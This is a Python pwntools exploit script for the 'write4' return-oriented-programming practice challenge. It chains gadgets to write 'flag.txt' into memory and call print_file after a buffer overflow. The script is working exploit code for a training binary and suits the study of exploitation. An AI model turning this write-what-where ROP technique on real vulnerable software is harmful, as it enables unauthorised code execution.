from pwn import cyclic, process, ROP, ELF, p64, log

_FILE = "./write4"

p = process(_FILE)
binary = ELF(_FILE, checksec=False)

rop = ROP(binary)

pop_r14_r15 = rop.find_gadget(["pop r14", "pop r15", "ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]                      # or 0x00400692
pop_qword_r14 = 0x400628 # rop.find_gadget(["mov QWORD PTR [r14], r15", "ret"])[0]   # or 0x00400628 is open file argument
pwnme_got =  binary.got['pwnme'] + 16 # 0x00600e00  # we gonna write "flag.txt" in this address +16 cause we don't wanna overwrite print_file got.plt address
log.info("pwnme: " + str(hex(pwnme_got)))
print_file = binary.plt['print_file']
flag_txt_str = b"flag.txt" # 8 characters
EOL = p64(0x0)             # adding null character at the end right after flag.txt so the file reader can open it.

# chaining
payload = cyclic(40, n=8)       # generating 40 characters pattern

## add null character right after the string ==> string[1] = "\x00"*8
payload += p64(pop_r14_r15)
payload += p64(pwnme_got+1)
payload += EOL      # load this string to rdi (aka argument)
payload += p64(pop_qword_r14)

## adding flag.txt ==> string[0] = "flag.txt";    notice that flag.txt is 8 character, if it was only 7 we could've got rid of the previous part doing string = "lag.txt\x00"
payload += p64(pop_r14_r15)
payload += p64(pwnme_got)
payload += flag_txt_str      # load this string to rdi (aka argument)
payload += p64(pop_qword_r14)

## passing flag.txt{\0<8 times>} as an argument to print_file
payload += p64(pop_rdi)
payload += p64(pwnme_got)
payload += p64(print_file)

# interacting and sending payload
print(p.recvuntil("> ").decode("latin-1"))

p.sendline(payload)

# printing output
print(p.clean().decode("latin-1"))

with open("exp", "wb") as f:
    f.write(payload)
    f.close()

